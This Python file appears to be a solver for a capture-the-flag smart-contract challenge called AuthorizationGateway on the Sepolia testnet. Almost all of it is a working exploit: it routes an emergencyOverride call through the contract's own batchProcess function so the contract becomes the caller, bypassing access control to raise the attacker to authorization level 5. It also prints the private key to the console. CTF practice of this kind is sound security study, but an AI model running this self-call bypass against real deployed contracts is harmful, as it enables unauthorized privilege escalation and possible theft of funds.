#!/usr/bin/env python3

# phase1/phase1.py


from web3 import Web3
from eth_account import Account
import time
import json
import os
from dotenv import load_dotenv

load_dotenv()  # Load environment variables from .env file

class AuthorizationGatewaySolver:
    def __init__(self, rpc_url, private_key, contract_address, contract_abi):
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))
        self.account = Account.from_key(private_key)
        self.contract_address = contract_address
        self.contract = self.w3.eth.contract(address=contract_address, abi=contract_abi)
        
        print(f"Connected to network: {self.w3.is_connected()}")
        print(f"Solver address: {self.account.address}")
        print(f"Balance: {self.w3.from_wei(self.w3.eth.get_balance(self.account.address), 'ether')} ETH")

    
    def request_initial_authorization(self):
        """Request initial authorization to get level 1"""
        print("\n=== STEP 1: Requesting Initial Authorization ===")
        
        try:
            txn = self.contract.functions.requestAuthorization().build_transaction({
                'from': self.account.address,
                'gas': 200000,
                'gasPrice': self.w3.to_wei('20', 'gwei'),
                'nonce': self.w3.eth.get_transaction_count(self.account.address)
            })
            
            signed_txn = self.account.sign_transaction(txn)
            tx_hash = self.w3.eth.send_raw_transaction(signed_txn.raw_transaction)
            
            print(f"Authorization request transaction sent: {tx_hash.hex()}")
            
            # Wait for confirmation
            receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
            
            if receipt.status == 1:
                print(" Authorization request successful!")
                
                # Check our new authorization level
                auth_info = self.contract.functions.getUserAuthInfo(self.account.address).call()
                print(f"New authorization level: {auth_info[1]}")
                
                return auth_info[1] >= 1
            else:
                print(" Authorization request failed")
                return False
                
        except Exception as e:
            print(f"Error requesting authorization: {e}")
            return False
       
    def exploit_access_control_bypass(self):
        """Exploit the access control bypass to achieve level 5"""
        print("\n=== STEP 2: Exploiting Access Control Bypass ===")
        
        try:
            # Create the emergencyOverride call data
            # We want to call emergencyOverride(our_address, 5)
            emergency_call_data = self.contract.encode_abi(
                'emergencyOverride',
                args=[self.account.address, 5]
            )
            
            print(f"Emergency override call data: {emergency_call_data}")
            
            # Use batchProcess to call emergencyOverride through the contract itself
            # This bypasses the access control since msg.sender will be address(this)
            targets = [self.contract_address]
            data = [emergency_call_data]
            
            # Build transaction
            txn = self.contract.functions.batchProcess(targets, data).build_transaction({
                'from': self.account.address,
                'gas': 300000,
                'gasPrice': self.w3.to_wei('20', 'gwei'),
                'nonce': self.w3.eth.get_transaction_count(self.account.address)
            })
            
            # Sign and send
            signed_txn = self.account.sign_transaction(txn)
            tx_hash = self.w3.eth.send_raw_transaction(signed_txn.raw_transaction)
            
            print(f"Bypass transaction sent: {tx_hash.hex()}")
            
            # Wait for confirmation
            receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
            
            if receipt.status == 1:
                print("✅ Access control bypass successful!")
                
                # Check our new authorization level
                auth_info = self.contract.functions.getUserAuthInfo(self.account.address).call()
                print(f"New authorization level: {auth_info[1]}")
                
                # Verify we exploited the vulnerability
                has_exploited = self.contract.functions.hasExploitedVulnerability(self.account.address).call()
                print(f"Exploit detected by contract: {has_exploited}")
                
                return auth_info[1] >= 5
            else:
                print(" Bypass transaction failed")
                return False
                
        except Exception as e:
            print(f"Error exploiting access control bypass: {e}")
            return False

    def solve(self):
        """Execute the complete exploit chain"""
        print(" Starting AuthorizationGateway CTF Solver")
        print("=" * 60)
 
        # Step 2: Escalate to level 5 through access control bypass
        if not self.exploit_access_control_bypass():
            print(" Failed to exploit access control bypass")
            return None




CONTRACT_ABI = [
    # Add the full ABI here after compiling the contract
    # For now, showing key function signatures
    {
        "inputs": [],
        "name": "requestAuthorization",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address[]", "name": "targets", "type": "address[]"},
            {"internalType": "bytes[]", "name": "data", "type": "bytes[]"}
        ],
        "name": "batchProcess",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "user", "type": "address"},
            {"internalType": "uint256", "name": "level", "type": "uint256"}
        ],
        "name": "emergencyOverride",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "getVerificationCode",
        "outputs": [{"internalType": "bytes32", "name": "", "type": "bytes32"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "user", "type": "address"}],
        "name": "getUserAuthInfo",
        "outputs": [
            {"internalType": "bool", "name": "isAuthorized", "type": "bool"},
            {"internalType": "uint256", "name": "level", "type": "uint256"},
            {"internalType": "uint256", "name": "cooldownEnds", "type": "uint256"},
            {"internalType": "bool", "name": "hasExploited", "type": "bool"}
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "user", "type": "address"}],
        "name": "hasExploitedVulnerability",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function"
    }
]


def run_phase1_from_env(rpc_url=None, private_key=None, contract_address=None):
    # read from args/env if parameters are None
    rpc_url = rpc_url or os.getenv("INFURA_url") or "https://sepolia.infura.io/v3/YOUR_INFURA_KEY"
    private_key = private_key or os.getenv("PRIVATE_KEY")
    contract_address = contract_address or os.getenv("AUTHORIZATION_ADDRESS")
    if not (rpc_url and private_key and contract_address):
        raise ValueError("Missing config for phase1")

    solver = AuthorizationGatewaySolver(rpc_url, private_key, contract_address, contract_abi=CONTRACT_ABI)
    # run steps you want; e.g. request and exploit
    solver.request_initial_authorization()
    success = solver.exploit_access_control_bypass()
    code = None

    return {"success": success, "address": solver.account.address}


def main():
    # Configuration - UPDATE THESE VALUES
    RPC_URL = os.getenv("INFURA_url") or "https://sepolia.infura.io/v3/YOUR_INFURA_KEY"
    PRIVATE_KEY = os.getenv("PRIVATE_KEY") or "0xYOUR_PRIVATE_KEY"
    CONTRACT_ADDRESS = (
    os.getenv("AUTHORIZATION_ADDRESS") or "0xYOUR_DEPLOYED_AUTHORIZATIONGATEWAY_ADDRESS"
)    
    # Contract ABI - You'll need to compile the contract to get this

    try:
        print("🔑 Initializing solver...", RPC_URL, PRIVATE_KEY, CONTRACT_ADDRESS)
        solver = AuthorizationGatewaySolver(RPC_URL, PRIVATE_KEY, CONTRACT_ADDRESS, CONTRACT_ABI)
        solver.solve()
    
            
    except Exception as e:
        print(f"Fatal error: {e}")

if __name__ == "__main__":
    main()

